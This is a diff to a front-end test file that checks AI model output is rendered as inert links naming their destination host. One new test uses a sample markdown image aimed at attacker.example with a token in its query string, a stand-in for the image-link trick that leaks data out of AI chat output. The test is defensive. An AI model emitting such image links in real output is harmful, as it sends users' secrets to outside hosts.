@@ -125,7 +125,20 @@ describe("model output renders as inert markup", () => {
 		expect(host.querySelector("img")).toBeNull();
 		const link = host.querySelector("a");
 		expect(link?.getAttribute("href")).toBe("https://example.com/chart.png?q=1");
-		expect(link?.textContent).toBe("a chart");
+		expect(link?.textContent).toBe("a chart (example.com)");
+	});
+
+	it("names where an image link leads, so a harmless caption cannot hide it", () => {
+		const host = renderInDocument(
+			"![Click to view](https://attacker.example/leak.png?token=SECRET) ![](https://cdn.example/x.png) ![events](/ai/channel/events)",
+		);
+		expect(
+			[...host.querySelectorAll("a")].map((link) => link.textContent),
+		).toEqual([
+			"Click to view (attacker.example)",
+			"cdn.example",
+			"events (/ai/channel/events)",
+		]);
 	});
 
 	it("opens every link in a new tab that cannot reach back to the dashboard", () => {
